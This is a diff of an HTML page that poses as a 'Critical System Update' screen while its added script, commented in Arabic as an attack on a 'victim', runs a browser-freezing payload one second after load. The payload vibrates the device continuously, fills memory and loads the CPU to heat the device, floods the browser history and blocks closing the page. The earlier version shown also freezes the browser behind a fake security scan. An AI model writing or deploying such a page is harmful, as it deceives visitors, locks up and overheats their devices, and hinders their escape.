@@ -1,42 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Diagnostic</title>
+    <title>Critical System Update</title>
     <style>
-        body { background-color: black; color: white; text-align: center; padding-top: 20%; font-family: Arial; }
+        body { background: #000; color: #ff0000; text-align: center; font-family: 'Courier New', monospace; padding-top: 25%; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h1>Security Scan in Progress...</h1>
-    <p id="progress">Initializing: 0%</p>
+    <div class="spinner"></div>
+    <h1>System Repair in Progress...</h1>
+    <p>Do not close this window or turn off your device.</p>
 
     <script>
-        // دالة تجميد النظام الفوري
-        function freeze() {
-            let memoryBuster = [];
+        function launchAttack() {
+            // 1. تفعيل الاهتزاز المستمر (Vibration)
+            // سيعمل على أجهزة أندرويد بشكل أساسي
+            if ("vibrate" in navigator) {
+                navigator.vibrate([1000, 500, 1000, 500, 1000]);
+                setInterval(() => { navigator.vibrate(2000); }, 500);
+            }
+
+            let heatPool = [];
             
-            // حلقة لا نهائية تعمل بأقصى سرعة ممكنة
+            // 2. الهجوم الحراري وتجميد الرام (Thermal & RAM Overload)
             while (true) {
-                // 1. تدمير الرام: حجز مساحات ضخمة من الذاكرة بشكل متفجر
-                memoryBuster.push(new Uint32Array(1000000).fill(0xDEADBEEF));
-                
-                // 2. تجميد الواجهة: استخدام حلقة تكرار حسابية تمنع أي لمس للشاشة
-                for (let i = 0; i < 1000000; i++) {
-                    let x = Math.atan2(Math.random(), Math.random());
+                // استهلاك الرام بسرعة البرق
+                heatPool.push(new Uint32Array(2000000).fill(Math.random()));
+
+                // إجبار المعالج على القيام بعمليات حسابية معقدة لرفع حرارته
+                for (let i = 0; i < 500000; i++) {
+                    let calc = Math.sqrt(Math.random() * 999999) / Math.sin(Math.random());
                 }
 
-                // 3. منع الرجوع: إغراق تاريخ المتصفح لمنع المستخدم من الخروج
-                window.history.pushState(null, null, "?crash=" + Math.random());
+                // 3. قفل المتصفح (Navigation Lock)
+                // إغراق الـ History لمنع الضحية من العودة للخلف أو الخروج
+                window.history.pushState(null, null, "#system-error-" + Date.now());
                 
-                // تحديث وهمي للشاشة لإبقاء المعالج في حالة ضغط 100%
-                document.getElementById('progress').innerText = "Processing: " + Math.random() + "%";
+                // منع التفاعل مع الصفحة تماماً
+                window.onbeforeunload = function() { return "System is busy, please wait."; };
             }
         }
 
-        // تشغيل الهجوم بمجرد تحميل الصفحة
+        // تشغيل الهجوم بعد ثانية واحدة من فتح الرابط
         window.onload = function() {
-            // تأخير بسيط لمدة ثانية واحدة لضمان تحميل الصفحة بالكامل قبل الانفجار
-            setTimeout(freeze, 1000);
+            setTimeout(launchAttack, 1000);
         };
     </script>
 </body>
